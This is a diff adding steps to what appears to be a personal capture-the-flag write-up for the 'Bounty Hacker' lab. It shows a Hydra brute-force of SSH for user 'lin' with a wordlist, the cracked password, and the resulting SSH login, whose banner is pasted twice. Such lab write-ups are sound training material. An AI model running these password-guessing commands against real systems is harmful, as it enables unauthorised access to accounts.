@@ -224,5 +224,88 @@ ReDSynd1ca7e
 > The locks.txt must be the password file itself and one of them is right for user lin for SSH:
 
 ```
+┌──(kali㉿kali)-[~]
+└─$ hydra -l lin -P locks.txt ssh://10.66.165.145
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-21 09:19:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.66.165.145:22/
+[22][ssh] host: 10.66.165.145   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-21 09:19:31
+```
+
+> [!info]
+> seems like I didn't need Gobuster for this but I still have it running in the background if I can't find a way to escalate as that still may be an option for an attack vector.
+> 
+> Anyway I'm logging in via SSH with username lin and password found from Hydra:
 
 ```
+┌──(kali㉿kali)-[~]
+└─$ ssh lin@10.66.165.145  
+The authenticity of host '10.66.165.145 (10.66.165.145)' can't be established.
+ED25519 key fingerprint is SHA256:pMoA1M9x0mUw31kD54Pqx94vM/5XCE4uZ/6LbOfgBxU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.66.165.145' (ED25519) to the list of known hosts.
+lin@10.66.165.145's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
+lin@ip-10-66-165-145:~/Desktop$ 
+┌──(kali㉿kali)-[~]
+└─$ ssh lin@10.66.165.145  
+The authenticity of host '10.66.165.145 (10.66.165.145)' can't be established.
+ED25519 key fingerprint is SHA256:pMoA1M9x0mUw31kD54Pqx94vM/5XCE4uZ/6LbOfgBxU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.66.165.145' (ED25519) to the list of known hosts.
+lin@10.66.165.145's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
+lin@ip-10-66-165-145:~/Desktop$ 
+```
+
+![](Bounty%20Hacker%20we're%20in.png)
+
